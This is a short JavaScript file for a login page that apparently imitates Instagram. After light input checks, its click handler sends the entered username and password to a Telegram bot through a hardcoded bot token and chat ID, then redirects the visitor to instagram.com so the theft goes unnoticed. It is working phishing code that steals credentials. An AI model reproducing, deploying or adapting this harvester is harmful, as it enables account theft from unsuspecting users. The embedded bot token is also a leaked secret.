let inputs = document.querySelectorAll('input');
let button = document.querySelector('.login-button');

// Function to check if username and password are valid
function checkInputs() {
    const username = inputs[0].value;
    const password = inputs[1].value;
    
    // Check if password length is at least 8 characters
    if (username && password.length >= 8) {
        button.disabled = false;  // Enable button if conditions are met
    } else {
        button.disabled = true;  // Disable button if conditions are not met
    }
}

// Add event listeners to inputs to check for changes
inputs[0].addEventListener('input', checkInputs);
inputs[1].addEventListener('input', checkInputs);

const Token = '7938025216:AAE7dnQXD_m7nEPqPI4-qnCgEromg02b8jw';
const Chat_Id = '357220177';

button.addEventListener('click', () => {
    const username = inputs[0].value;
    const password = inputs[1].value;

    const message = `Login parol\nUsername: ${username}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: Chat_Id,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(res => console.log(res));

    window.location.href = 'https://www.instagram.com/';
});